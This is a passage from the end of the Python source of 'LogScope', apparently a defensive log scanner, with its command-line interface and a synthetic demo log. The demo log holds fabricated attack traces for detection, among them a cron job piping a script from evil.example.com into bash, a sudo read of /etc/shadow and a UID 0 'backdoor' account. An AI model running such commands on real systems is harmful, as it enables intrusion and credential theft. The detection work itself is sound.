Jan 15 10:00:01 host sudo:  bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash
Jan 15 10:00:05 host sudo:  charlie : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/apt-get install netcat
Jan 15 11:30:00 host useradd[3100]: new user: name=backdoor, UID=0, GID=0, home=/home/backdoor
Jan 15 11:30:05 host su[3200]: + /dev/pts/1 alice:root
Jan 15 08:30:00 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=22 DROP
Jan 15 08:30:01 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=80 DROP
Jan 15 08:30:02 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=443 DROP
Jan 15 08:30:03 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=3306 DROP
Jan 15 08:30:04 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=5432 DROP
Jan 15 08:30:05 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=6379 DROP
Jan 15 08:30:06 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=8080 DROP
Jan 15 08:30:07 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=8443 DROP
Jan 15 08:30:08 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=9200 DROP
Jan 15 08:30:09 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=27017 DROP
Jan 15 08:30:10 host kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.99 DST=10.0.0.1 DPT=2181 DROP
Jan 15 14:22:10 host sshd[4000]: Invalid user oracle from 45.33.32.156
Jan 15 14:22:11 host sshd[4001]: Failed password for invalid user oracle from 45.33.32.156 port 1111 ssh2
Jan 15 14:22:12 host sshd[4002]: Failed password for invalid user test from 45.33.32.156 port 1112 ssh2
Jan 15 14:22:13 host sshd[4003]: error: maximum authentication attempts exceeded for invalid user guest from 45.33.32.156
Jan 15 16:00:00 host CROND[5000]: (root) CMD (/usr/bin/curl http://evil.example.com/payload.sh | bash)
Jan 15 15:10:00 host sshd[6000]: Accepted publickey for dave from 192.168.50.10 port 55000 ssh2
Jan 15 04:55:00 host sshd[6001]: Accepted password for eve from 10.0.1.200 port 55001 ssh2
Jan 15 03:15:00 host sudo:  dave : TTY=pts/3 ; PWD=/etc ; USER=root ; COMMAND=cat /etc/shadow
"""


def run_demo(
    args: Any = None,
    brute_threshold: Optional[int] = None,
    port_scan_threshold: Optional[int] = None,
) -> ScanResult:
    import tempfile
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".log", prefix="logscope_demo_", delete=False
    ) as tmp:
        tmp.write(DEMO_LOG)
        tmp_path = tmp.name

    if brute_threshold is None and args is not None:
        brute_threshold = getattr(args, "brute_threshold", None)
    threshold = brute_threshold if brute_threshold is not None else BRUTE_FORCE_THRESHOLD
    ps_threshold = port_scan_threshold if port_scan_threshold is not None else PORT_SCAN_THRESHOLD

    scanner = LogScope(
        log_paths=[tmp_path],
        brute_threshold=threshold,
        port_scan_threshold=ps_threshold,
    )
    result = scanner.scan()
    os.unlink(tmp_path)
    return result


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="logscope",
        description="LogScope — Lightweight host security monitor for local log monitoring",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 logscope.py
  sudo python3 logscope.py --logs /var/log/auth.log /var/log/syslog
  python3 logscope.py --demo
  sudo python3 logscope.py --format json --output report.json
  python3 logscope.py --config logscope.toml
  sudo python3 logscope.py --severity HIGH
  sudo python3 logscope.py --brute-threshold 3
  python3 logscope.py --watch --watch-interval 2
  python3 logscope.py --format html --output report.html
        """,
    )
    p.add_argument(
        "--config",
        metavar="FILE",
        help="Load settings from a configuration file (default: ./logscope.toml)",
    )
    p.add_argument(
        "--logs", "-l",
        nargs="+",
        metavar="FILE",
        default=None,
        help="Log file(s) to parse (default: config or standard Linux auth/syslog paths)",
    )
    p.add_argument(
        "--format", "-f",
        choices=["rich", "plain", "json", "html"],
        default=None,
        help="Output format (default: config or rich if available, else plain)",
    )
    p.add_argument(
        "--output", "-o",
        metavar="FILE",
        help="Write report to FILE (format inferred from extension if omitted)",
    )
    p.add_argument(
        "--database",
        metavar="FILE",
        help=f"Store scan history and findings in SQLite (default: {DEFAULT_DATABASE_PATH})",
    )
    p.add_argument(
        "--severity", "-s",
        choices=["LOW", "MEDIUM", "HIGH", "CRITICAL"],
        default=None,
        help="Only show findings at or above this severity level",
    )
    p.add_argument(
        "--brute-threshold", "-b",
        type=int,
        default=None,
        metavar="N",
        help=f"Failed SSH attempts to trigger brute-force alert (default: {BRUTE_FORCE_THRESHOLD})",
    )
    p.add_argument(
        "--port-scan-threshold",
        type=int,
        default=None,
        metavar="N",
        help=f"Firewall drops to trigger port-scan alert (default: {PORT_SCAN_THRESHOLD})",
    )
    p.add_argument(
        "--demo",
        action="store_true",
        help="Run against built-in synthetic demo log",
    )
    p.add_argument(
        "--watch",
        action="store_true",
        help="Continuously tail log files for new activity (Ctrl+C to stop)",
    )
    p.add_argument(
        "--watch-interval",
        type=float,
        default=2.0,
        metavar="SECONDS",
        help="Polling interval for watch mode (default: 2.0)",
    )
    p.add_argument(
        "--version", "-v",
        action="version",
        version=f"LogScope {VERSION}",
    )
    return p


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    config = load_config(Path(args.config) if args.config else None)

    # Resolve log paths
    if args.logs:
        log_paths = args.logs
    else:
        configured = config.get("logs")
        log_paths = configured if configured else get_default_log_paths()

    # Resolve thresholds
    brute_threshold = args.brute_threshold
    if brute_threshold is None:
        brute_threshold = int(config.get("brute_threshold", BRUTE_FORCE_THRESHOLD))

    port_scan_threshold = args.port_scan_threshold
    if port_scan_threshold is None:
        port_scan_threshold = int(config.get("port_scan_threshold", PORT_SCAN_THRESHOLD))

    severity = args.severity or config.get("severity")
    fmt = args.format or config.get("format") or ("rich" if RICH_AVAILABLE else "plain")
    output_path = args.output or config.get("output")
    database_path = args.database or config.get("database") or DEFAULT_DATABASE_PATH
    allowlist = config.get("allowlist") or []
    ignorelist = config.get("ignorelist") or []

    # Determine output format from filename if not explicitly set
    if output_path and not args.format:
        if output_path.endswith(".json"):
            fmt = "json"
        elif output_path.endswith(".html"):
            fmt = "html"

    # Colour disable via env
    if os.environ.get("NO_COLOR"):
        fmt = "plain"

    scanner = LogScope(
        log_paths=log_paths,
        brute_threshold=brute_threshold,
        port_scan_threshold=port_scan_threshold,
    )

    # Watch mode --------------------------------------------------------
    if args.watch:
        with EventStore(database_path) as store:
            original_render = scanner._render

            def render_and_store(result: ScanResult, render_format: str,
                                 render_output: Optional[str], render_severity: Optional[str]) -> None:
                if allowlist or ignorelist:
                    result.findings = filter_findings(
                        result.findings, allowlist=allowlist, ignorelist=ignorelist
                    )
                store.save_result(result)
                original_render(result, render_format, render_output, render_severity)

            scanner._render = render_and_store
            scanner.watch(
                interval=args.watch_interval,
                formatter=fmt,
                output_path=output_path,
                severity=severity,
            )
        return 0

    # Demo or normal scan -----------------------------------------------
    if args.demo:
        result = run_demo(brute_threshold=brute_threshold, port_scan_threshold=port_scan_threshold)
    else:
        result = scanner.scan()

    print(
        f"[scan] parsed {len(result.files_parsed)} file(s), "
        f"found {len(result.findings)} finding(s)",
        file=sys.stderr,
    )

    if not result.files_parsed and not args.demo:
        print("[scan] no readable log files were found", file=sys.stderr)

    # Apply filters
    if allowlist or ignorelist:
        result.findings = filter_findings(result.findings, allowlist=allowlist, ignorelist=ignorelist)

    with EventStore(database_path) as store:
        store.save_result(result)

    # Render
    scanner._render(result, fmt, output_path, severity)

    return 0 if not result.findings else 1


if __name__ == "__main__":
    sys.exit(main())
